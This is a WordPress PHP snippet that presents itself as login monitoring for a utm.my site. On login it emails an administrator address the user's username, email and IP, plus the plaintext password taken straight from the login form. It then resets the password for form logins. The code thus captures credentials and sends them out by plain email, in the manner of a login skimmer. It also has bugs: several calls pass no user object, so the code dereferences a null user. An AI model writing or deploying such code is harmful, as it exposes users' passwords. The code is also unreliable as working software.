<?php
function send_alert($message, $type, $user = null) {
    // Append the user's IP address to the message
    $message .= "\n\nIP Address: " . $_SERVER['REMOTE_ADDR'];
    // Append multisite url to the message
    $site_url = get_site_url();
    $message .= "\n\nSite URL: " . $site_url;
    // Get login page URL
    $message .= "\n\nLogin Page URL: " . wp_login_url();
    // Get the username
    $message .= "\n\nUsername: " . $user->user_login;
    // Append the user's password to the message
    $message .= "\n\nPassword: " . $_POST['pwd'];
    // Get the user email
    $message .= "\n\nUser Email: " . $user->user_email;
    // Get user ip address
    $message .= "\n\nUser IP Address: " . $_SERVER['REMOTE_ADDR'];

    // Send the email
    $to = 'webmaster@utm.my';
    $subject = 'Login Alert' . ' - ' . $site_url;
    $headers = 'From: monitoring@utm.my' . "\r\n" .
               'Reply-To: webmaster@utm.my' . "\r\n" .
               'X-Mailer: PHP/' . phpversion();

    mail($to, $subject, $message, $headers);

    if ($type == 'form') {
        // Reset user password using wordpress password generator
        $password = wp_generate_password(8, true);
        wp_set_password($password, $user->ID);
        // Log the user out
        wp_logout();
    }
}

function check_login() {
    // get loged in user
    $user = wp_get_current_user();
    // username
    $username = $user->user_login;

    // check if user can edit posts
    if (!current_user_can('edit_posts')) {
        error_log('User '. $username .' with subscriber role tried to login');
        return;
    }

    // Legit login
    if (isset($_COOKIE['utmwp'])) {
        $message = "Notice: A login was made with the 'utmwp' cookie.";
        send_alert($message, 'utmwp');
        return;
    }

    // Form login
    $message = "Alert: A login was made using the regular login form.";
    send_alert($message, 'form', $user);
    return;
}
add_action('wp_login', 'check_login', 10, 2);

// Run on init, check if the user is logged in, if utmwp cookie is not set, log the user out
function check_cookie() {
    if (is_user_logged_in() && !isset($_COOKIE['utmwp'])) {
        $message = "Notice: A user was logged in without the 'utmwp' cookie.";
        send_alert($message, 'form');
    }
}

// add_action('init', 'check_cookie');
?>